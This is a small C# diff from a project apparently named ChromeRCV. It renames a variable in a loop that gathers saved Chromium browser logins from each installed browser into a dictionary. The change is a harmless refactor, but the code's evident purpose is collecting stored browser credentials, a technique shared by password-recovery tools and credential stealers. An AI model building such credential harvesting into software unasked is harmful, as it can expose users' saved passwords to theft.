@@ -25,8 +25,8 @@ namespace ChromeRCV
                     if(manager.Reinitialize(browserPath) == null)
                         continue;
                     
-                    List<ChromiumLogin> history = manager.GetData();
-                    d.Add(manager.Browser, history);
+                    List<ChromiumLogin> logins = manager.GetData();
+                    d.Add(manager.Browser, logins);
                 }
             }
             return d;
